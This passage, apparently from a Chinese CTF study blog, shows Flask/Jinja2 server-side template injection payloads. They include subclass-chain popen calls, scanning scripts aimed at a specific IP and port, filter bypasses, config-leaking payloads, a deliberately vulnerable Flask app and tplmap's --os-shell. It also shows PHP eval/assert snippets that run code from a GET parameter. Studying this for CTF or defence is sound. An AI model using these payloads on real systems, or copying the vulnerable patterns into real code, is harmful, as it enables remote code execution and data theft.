class="line-numbers-rows"><span></span></span></code></pre><p>__init__初始化类，然后globals全局来查找所有的的方法及变量参数</p><p>要找到这个类&lt;class ‘os._wrap_close’&gt; 所对应的序号</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">198</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>os<span class="token punctuation">.</span>_wrap_close<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样的话就可以使用各种各样的方法比如popen</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">138</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#这样就可以读取当前目录下的内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">138</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#这样就实现了读取文件 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="通过查找对应的函数模块或者类来进行构造"><a href="#通过查找对应的函数模块或者类来进行构造" class="headerlink" title="通过查找对应的函数模块或者类来进行构造"></a>通过查找对应的函数模块或者类来进行构造</h2><h3 id="查找eval函数"><a href="#查找eval函数" class="headerlink" title="查找eval函数"></a>查找eval函数</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52'</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__&#125;&#125;"</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'os.py'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  payload<span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查找os模块"><a href="#查找os模块" class="headerlink" title="查找os模块"></a>查找os模块</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52'</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__&#125;&#125;"</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'os.py'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  payload<span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查找importlib类"><a href="#查找importlib类" class="headerlink" title="查找importlib类"></a>查找importlib类</h3><p>Python 中存在 &lt;class ‘_frozen_importlib.BuiltinImporter’&gt; 类，目的就是提供 Python 中 import 语句的实现（以及 <strong>import</strong> 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。</p><p>也可以搜索__import__函数来导入os模块</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52'</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"].__init__.__globals__&#125;&#125;"</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'__import__'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  payload<span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="类的总结"><a href="#类的总结" class="headerlink" title="类的总结"></a>类的总结</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">__class__            类的一个内置属性，表示实例对象的类。__base__             类型对象的直接基类__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>     返回这个类的子类集合，Each <span class="token keyword">class</span> <span class="token class-name">keeps</span> a <span class="token builtin">list</span> of weak references to its immediate subclasses<span class="token punctuation">.</span> This method returns a <span class="token builtin">list</span> of <span class="token builtin">all</span> those references still alive<span class="token punctuation">.</span> The <span class="token builtin">list</span> <span class="token keyword">is</span> <span class="token keyword">in</span> definition order<span class="token punctuation">.</span>__init__             初始化类，返回的类型是function__globals__          使用方式是 函数名<span class="token punctuation">.</span>__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__<span class="token punctuation">(</span><span class="token punctuation">)</span>   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行<span class="token punctuation">.</span>操作的时候（形如：a<span class="token punctuation">.</span>xxx<span class="token operator">/</span>a<span class="token punctuation">.</span>xxx<span class="token punctuation">(</span><span class="token punctuation">)</span>），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__<span class="token punctuation">(</span><span class="token punctuation">)</span>        调用字典中的键值，其实就是调用这个魔术方法，比如a<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span>，就是a<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身如<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。<span class="token builtin">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span>            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum<span class="token punctuation">.</span>__globals__含有os模块：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>current_app          应用上下文，一个全局变量。request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="token builtin">open</span>函数<span class="token punctuation">:</span>request<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/proc\self\fd/3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>x1    get传参request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x1  所有参数request<span class="token punctuation">.</span>cookies      cookies参数request<span class="token punctuation">.</span>headers      请求头参数request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>x1    post传参<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>applicaation<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded或multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">)</span>request<span class="token punctuation">.</span>data   post传参<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span>request<span class="token punctuation">.</span>json post传json  <span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>json<span class="token punctuation">)</span>config               当前application的所有配置。此外，也可以这样<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>g                    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>得到<span class="token operator">&lt;</span>flask<span class="token punctuation">.</span>g of <span class="token string">'flask_ssti'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">138</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">138</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'popen'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="利用config读取flag"><a href="#利用config读取flag" class="headerlink" title="利用config读取flag"></a>利用config读取flag</h3><p>如果flag是利用app.config[‘flag’]&#x3D;’*******’ 进行配置的</p><p>则可以利用来读取</p><p>或者</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span><span class="token builtin">dict</span><span class="token punctuation">.</span>__TemplateReference__context<span class="token punctuation">.</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>FLAG<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>FLAG<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>request<span class="token punctuation">.</span>application<span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>_get_data_for_json<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'json'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>JSONEncoder<span class="token punctuation">.</span>default<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的ssti漏洞代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template_stringapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'sdhgfdfsdhfjsgfs'</span>    templates<span class="token operator">=</span><span class="token triple-quoted-string string">'''&lt;!DOCTYPE html>&lt;html lang="en">&lt;head>    &lt;meta charset="UTF-8">    &lt;title>Title&lt;/title>&lt;/head>&lt;body>        &#123;&#125;&lt;/body>&lt;/html>            '''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用括号进行绕过</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">138</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">138</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>func<span class="token operator">=</span>popen<span class="token operator">&amp;</span>cmd<span class="token operator">=</span><span class="token builtin">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">'__'</span><span class="token operator">+</span><span class="token string">"cl"</span><span class="token operator">+</span><span class="token string">"ass"</span><span class="token operator">+</span><span class="token string">'__'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="TPLMAP的使用"><a href="#TPLMAP的使用" class="headerlink" title="TPLMAP的使用"></a>TPLMAP的使用</h2><p>下载</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;tplmap.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装</p><pre class="line-numbers language-none"><code class="language-none">pip install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行</p><pre class="line-numbers language-none"><code class="language-none">python tplmap.py -u &quot;url&#x2F;?key&#x3D;111*&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#获取shell</span>python2 tplmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url?flag <span class="token operator">-</span><span class="token operator">-</span>os<span class="token operator">-</span>shell<span class="token comment">#查看目录</span>ls<span class="token comment">#发现flag文件，打开</span>cat flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> SSTI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2023/03/15/RCE/"/>
      <url>/2023/03/15/RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="代码执行的相关函数"><a href="#代码执行的相关函数" class="headerlink" title="代码执行的相关函数"></a>代码执行的相关函数</h2><p>eval函数会把函数内的语句当作php代码执行但是 语句后面需要分号</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//?cmd=phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>assert与eval功能相似 但是兼容性更强  后面加不加分号都可以</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php    highlight_file(__FILE__);$cmd&#x3D;$_GET[&#39;cmd&#39;];assert($cmd);?&gt;&#x2F;&#x2F;?cmd&#x3D;phpinfo();&#x2F;&#x2F;?cmd&#x3D;phpinfo()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安全防御：加引号</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php    highlight_file(__FILE__);$cmd&#x3D;$_GET[&#39;cmd&#39;];eval(&quot;\ret&#x3D; strtolower(&#39;$cmd&#39;);&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有GPC配置文件开启才能绕过   高版本的PHP已经淘汰GPC</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>cmd<span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>preg_replace()   加上&#x2F;e会  匹配之后会形成代码执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string 